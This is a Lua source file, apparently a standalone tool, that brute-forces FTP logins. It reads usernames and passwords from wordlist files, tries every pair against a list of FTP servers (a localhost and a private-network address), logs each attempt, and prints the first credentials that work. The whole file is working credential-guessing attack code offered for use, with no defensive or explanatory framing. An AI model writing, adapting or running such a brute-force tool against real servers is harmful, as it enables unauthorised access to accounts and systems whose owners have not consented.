local socket = require("socket")
local ftp = require("socket.ftp")

-- Function to read usernames and passwords from files
local function read_list_from_file(file_path)
    local list = {}
    for line in io.lines(file_path) do
        table.insert(list, line)
    end
    return list
end

-- FTP server details
local ftp_servers = {
    {server = "127.0.0.1", port = 21},
    {server = "192.168.1.100", port = 21}
}

local usernames_file = "usernames.txt"
local passwords_file = "passwords.txt"

local usernames = read_list_from_file(usernames_file)
local passwords = read_list_from_file(passwords_file)

local log_file = io.open("ftp_bruteforce_log.txt", "a")

local function log_result(message)
    log_file:write(message .. "\n")
    log_file:flush()
end

local function attempt_login(server, port, username, password)
    local success, response = pcall(function()
        return ftp.get({
            host = server,
            port = port,
            user = username,
            password = password,
            timeout = 5 -- Set timeout for FTP connection
        })
    end)
    return success, response
end

for _, ftp_details in ipairs(ftp_servers) do
    for _, username in ipairs(usernames) do
        for _, password in ipairs(passwords) do
            local success, response = attempt_login(ftp_details.server, ftp_details.port, username, password)
            if success then
                local message = "Successful login to " .. ftp_details.server .. "!"
                message = message .. " Username: " .. username .. " Password: " .. password
                print(message)
                log_result(message)
                return
            else
                local message = "Failed login for " .. ftp_details.server .. " " .. username .. "/" .. password
                print(message)
                log_result(message)
            end
        end
    end
end

log_file:close()
print("Brute-force attack completed.")
